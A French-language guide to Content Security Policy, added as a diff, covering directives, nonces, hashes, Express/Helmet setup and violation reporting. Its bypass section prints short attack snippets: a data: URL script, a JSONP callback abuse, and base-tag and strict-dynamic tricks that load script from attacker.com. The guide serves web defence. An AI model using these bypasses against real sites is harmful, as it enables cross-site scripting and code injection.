@@ -1,0 +1,535 @@
+---
+title: "Content Security Policy (CSP) - Guide complet de sécurité"
+category: "web-security"
+description: "Guide expert sur CSP : directives complètes, configuration sécurisée, nonces et hashes, techniques de bypass, implémentation, reporting, bonnes pratiques et outils de test."
+coverImage: "/guides/csp.jpg"
+date: "2024-03-18"
+difficulty: "avancé"
+readingTime: "40 min"
+prerequisites: ["XSS", "JavaScript", "HTTP Headers"]
+lastUpdated: "2024-12-19"
+---
+
+# Content Security Policy (CSP) - Guide complet de sécurité
+
+Content Security Policy (CSP) est un mécanisme de sécurité qui permet de spécifier quelles ressources un navigateur peut charger et exécuter, réduisant significativement les risques XSS et d'injection de code. CSP est un complément essentiel aux autres mesures de sécurité web.
+
+## Introduction
+
+CSP fonctionne en permettant aux développeurs de déclarer une politique de sécurité via un header HTTP ou une balise meta. Le navigateur applique cette politique et bloque les ressources qui ne la respectent pas.
+
+**Avantages :**
+- Protection contre XSS
+- Protection contre l'injection de code
+- Contrôle granulaire des ressources
+- Reporting des violations
+
+**Limitations :**
+- Ne protège pas contre toutes les attaques
+- Peut être complexe à configurer
+- Peut casser des applications existantes
+
+## Directives principales
+
+### default-src
+
+Source par défaut pour toutes les directives non spécifiées.
+
+```
+Content-Security-Policy: default-src 'self'
+```
+
+**Comportement :** Si une directive n'est pas spécifiée, `default-src` s'applique.
+
+### script-src
+
+Contrôle l'exécution de JavaScript.
+
+```
+Content-Security-Policy: script-src 'self' 'unsafe-inline'
+```
+
+**Sources autorisées :**
+- `'self'` : Même origine
+- `'unsafe-inline'` : Code inline (⚠️ à éviter)
+- `'unsafe-eval'` : eval(), Function(), etc. (⚠️ à éviter)
+- `https:` : Toutes les URLs HTTPS
+- Domaine spécifique : `https://cdn.example.com`
+- Nonce : `'nonce-abc123'`
+- Hash : `'sha256-hash'`
+
+### style-src
+
+Contrôle les feuilles de style CSS.
+
+```
+Content-Security-Policy: style-src 'self' 'unsafe-inline'
+```
+
+### img-src
+
+Contrôle le chargement d'images.
+
+```
+Content-Security-Policy: img-src 'self' data: https:
+```
+
+### connect-src
+
+Contrôle les connexions réseau (fetch, XMLHttpRequest, WebSocket, etc.).
+
+```
+Content-Security-Policy: connect-src 'self' https://api.example.com
+```
+
+### font-src
+
+Contrôle le chargement des polices.
+
+```
+Content-Security-Policy: font-src 'self' https://fonts.googleapis.com
+```
+
+### object-src
+
+Contrôle les plugins (Flash, etc.). Généralement mis à `'none'`.
+
+```
+Content-Security-Policy: object-src 'none'
+```
+
+### media-src
+
+Contrôle les médias (audio, video).
+
+```
+Content-Security-Policy: media-src 'self'
+```
+
+### frame-src
+
+Contrôle les iframes.
+
+```
+Content-Security-Policy: frame-src 'self' https://trusted.com
+```
+
+### base-uri
+
+Contrôle l'élément `<base>`.
+
+```
+Content-Security-Policy: base-uri 'self'
+```
+
+### form-action
+
+Contrôle les actions des formulaires.
+
+```
+Content-Security-Policy: form-action 'self'
+```
+
+### frame-ancestors
+
+Contrôle qui peut intégrer la page dans un iframe (remplace X-Frame-Options).
+
+```
+Content-Security-Policy: frame-ancestors 'none'
+```
+
+### upgrade-insecure-requests
+
+Force la mise à niveau des requêtes HTTP vers HTTPS.
+
+```
+Content-Security-Policy: upgrade-insecure-requests
+```
+
+### block-all-mixed-content
+
+Bloque tout contenu mixte (HTTP sur page HTTPS).
+
+```
+Content-Security-Policy: block-all-mixed-content
+```
+
+## Sources autorisées
+
+### 'self'
+
+Autorise les ressources de la même origine.
+
+```
+script-src 'self'
+```
+
+### 'unsafe-inline'
+
+Autorise le code inline (⚠️ dangereux, à éviter).
+
+```
+script-src 'unsafe-inline'
+```
+
+### 'unsafe-eval'
+
+Autorise eval(), Function(), setTimeout(string), etc. (⚠️ très dangereux).
+
+```
+script-src 'unsafe-eval'
+```
+
+### https:
+
+Autorise toutes les URLs HTTPS.
+
+```
+script-src https:
+```
+
+### Domaine spécifique
+
+Autorise un domaine spécifique.
+
+```
+script-src https://cdn.example.com
+```
+
+### Wildcard
+
+Autorise tous les sous-domaines.
+
+```
+script-src https://*.example.com
+```
+
+### data:
+
+Autorise les URLs data: (pour images, etc.).
+
+```
+img-src 'self' data:
+```
+
+### blob:
+
+Autorise les URLs blob:.
+
+```
+script-src 'self' blob:
+```
+
+## Nonces
+
+Les nonces permettent d'autoriser du code inline spécifique.
+
+### Génération
+
+```javascript
+const crypto = require('crypto');
+
+function generateNonce() {
+    return crypto.randomBytes(16).toString('base64');
+}
+
+const nonce = generateNonce();
+```
+
+### Utilisation côté serveur
+
+```javascript
+const express = require('express');
+const helmet = require('helmet');
+
+app.use((req, res, next) => {
+    res.locals.nonce = crypto.randomBytes(16).toString('base64');
+    next();
+});
+
+app.use(helmet.contentSecurityPolicy({
+    directives: {
+        scriptSrc: [
+            "'self'",
+            (req, res) => `'nonce-${res.locals.nonce}'`
+        ]
+    }
+}));
+```
+
+### Utilisation côté client
+
+```html
+<script nonce="abc123">
+    // Ce script sera exécuté
+</script>
+
+<script>
+    // Ce script sera bloqué
+</script>
+```
+
+## Hashes
+
+Les hashes permettent d'autoriser des scripts spécifiques par leur contenu.
+
+### Calcul du hash
+
+```javascript
+const crypto = require('crypto');
+
+function calculateHash(content) {
+    const hash = crypto.createHash('sha256').update(content).digest('base64');
+    return `'sha256-${hash}'`;
+}
+
+const scriptContent = "console.log('Hello');";
+const hash = calculateHash(scriptContent);
+// Résultat : 'sha256-abc123...'
+```
+
+### Configuration
+
+```
+Content-Security-Policy: script-src 'self' 'sha256-abc123...'
+```
+
+### Utilisation
+
+```html
+<script>
+    console.log('Hello');
+</script>
+```
+
+Le hash doit correspondre exactement au contenu du script.
+
+## Implémentation
+
+### Express.js avec Helmet
+
+```javascript
+const express = require('express');
+const helmet = require('helmet');
+
+const app = express();
+
+app.use(helmet.contentSecurityPolicy({
+    directives: {
+        defaultSrc: ["'self'"],
+        scriptSrc: [
+            "'self'",
+            "'strict-dynamic'",
+            (req, res) => `'nonce-${res.locals.nonce}'`
+        ],
+        styleSrc: ["'self'", "'unsafe-inline'"],
+        imgSrc: ["'self'", "data:", "https:"],
+        connectSrc: ["'self'"],
+        fontSrc: ["'self'"],
+        objectSrc: ["'none'"],
+        mediaSrc: ["'self'"],
+        frameSrc: ["'none'"],
+        baseUri: ["'self'"],
+        formAction: ["'self'"],
+        upgradeInsecureRequests: []
+    },
+    reportOnly: false
+}));
+```
+
+### Configuration stricte
+
+```javascript
+app.use(helmet.contentSecurityPolicy({
+    directives: {
+        defaultSrc: ["'self'"],
+        scriptSrc: [
+            "'self'",
+            "'strict-dynamic'"
+        ],
+        styleSrc: ["'self'"],
+        imgSrc: ["'self'", "data:"],
+        connectSrc: ["'self'"],
+        fontSrc: ["'self'"],
+        objectSrc: ["'none'"],
+        mediaSrc: ["'self'"],
+        frameSrc: ["'none'"],
+        baseUri: ["'self'"],
+        formAction: ["'self'"],
+        upgradeInsecureRequests: [],
+        blockAllMixedContent: true
+    }
+}));
+```
+
+### Mode report-only
+
+Permet de tester CSP sans bloquer les ressources.
+
+```javascript
+app.use(helmet.contentSecurityPolicy({
+    directives: {
+        defaultSrc: ["'self'"]
+    },
+    reportOnly: true
+}));
+```
+
+## Reporting
+
+### report-uri / report-to
+
+Envoie les violations à une URL spécifiée.
+
+```javascript
+app.use(helmet.contentSecurityPolicy({
+    directives: {
+        defaultSrc: ["'self'"]
+    },
+    reportUri: '/api/csp-report'
+}));
+```
+
+### Gestionnaire de rapports
+
+```javascript
+app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
+    const report = req.body['csp-report'];
+    
+    logger.warn('CSP violation', {
+        documentUri: report['document-uri'],
+        violatedDirective: report['violated-directive'],
+        blockedUri: report['blocked-uri'],
+        sourceFile: report['source-file'],
+        lineNumber: report['line-number']
+    });
+    
+    res.status(204).send();
+});
+```
+
+## Techniques de bypass
+
+### Bypass avec data: URLs
+
+Si `script-src` autorise `data:`, un attaquant peut injecter :
+
+```javascript
+// Vulnérable
+script-src 'self' data:
+
+// Attaque
+<script src="data:text/javascript,alert('XSS')"></script>
+```
+
+**Protection :** Ne jamais autoriser `data:` dans `script-src`.
+
+### Bypass avec JSONP
+
+Si un endpoint JSONP est autorisé :
+
+```javascript
+// Vulnérable
+script-src 'self' https://api.example.com
+
+// Attaque
+<script src="https://api.example.com/jsonp?callback=alert"></script>
+```
+
+**Protection :** Valider strictement les callbacks JSONP.
+
+### Bypass avec base tag
+
+Si `base-uri` n'est pas restreint :
+
+```html
+<base href="https://attacker.com/">
+<script src="/legitimate.js"></script>
+```
+
+**Protection :** Restreindre `base-uri` à `'self'`.
+
+### Bypass avec strict-dynamic
+
+`'strict-dynamic'` permet aux scripts chargés dynamiquement de charger d'autres scripts.
+
+```javascript
+// Configuration
+script-src 'self' 'strict-dynamic'
+
+// Script chargé dynamiquement peut charger d'autres scripts
+const script = document.createElement('script');
+script.src = 'https://attacker.com/malicious.js';
+document.head.appendChild(script);
+```
+
+**Protection :** Utiliser `'strict-dynamic'` avec précaution, uniquement avec des nonces.
+
+## Bonnes pratiques
+
+### Checklist de sécurité
+
+- [ ] Éviter `'unsafe-inline'` dans `script-src`
+- [ ] Éviter `'unsafe-eval'` dans `script-src`
+- [ ] Utiliser des nonces ou hashes pour le code inline nécessaire
+- [ ] Implémenter en mode report-only d'abord
+- [ ] Tester régulièrement la configuration
+- [ ] Monitorer les violations CSP
+- [ ] Restreindre `object-src` à `'none'`
+- [ ] Restreindre `base-uri` à `'self'`
+- [ ] Utiliser `upgrade-insecure-requests`
+- [ ] Utiliser `block-all-mixed-content`
+- [ ] Configurer `frame-ancestors` pour prévenir le clickjacking
+- [ ] Valider les rapports de violation
+- [ ] Documenter la configuration CSP
+- [ ] Former l'équipe sur CSP
+
+### Configuration recommandée
+
+```javascript
+const cspConfig = {
+    defaultSrc: ["'self'"],
+    scriptSrc: [
+        "'self'",
+        "'strict-dynamic'",
+        (req, res) => `'nonce-${res.locals.nonce}'`
+    ],
+    styleSrc: ["'self'"],
+    imgSrc: ["'self'", "data:", "https:"],
+    connectSrc: ["'self'"],
+    fontSrc: ["'self'"],
+    objectSrc: ["'none'"],
+    mediaSrc: ["'self'"],
+    frameSrc: ["'none'"],
+    baseUri: ["'self'"],
+    formAction: ["'self'"],
+    frameAncestors: ["'none'"],
+    upgradeInsecureRequests: [],
+    blockAllMixedContent: true
+};
+```
+
+## Outils de test
+
+### CSP Evaluator
+
+Outil en ligne pour évaluer la configuration CSP : https://csp-evaluator.withgoogle.com/
+
+### CSP Scanner
+
+Scanner automatique des violations CSP.
+
+### Browser DevTools
+
+Les DevTools des navigateurs affichent les violations CSP dans la console.
+
+## Conclusion
+
+CSP est un outil puissant pour réduire les risques XSS et d'injection de code. Une configuration stricte, combinée à l'utilisation de nonces et de hashes, améliore significativement la sécurité. Cependant, CSP doit être complémentaire à d'autres mesures de sécurité et ne doit pas être la seule protection.
+
+## Références techniques
+
+- [MDN - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+- [W3C CSP Specification](https://www.w3.org/TR/CSP3/)
+- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
+- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
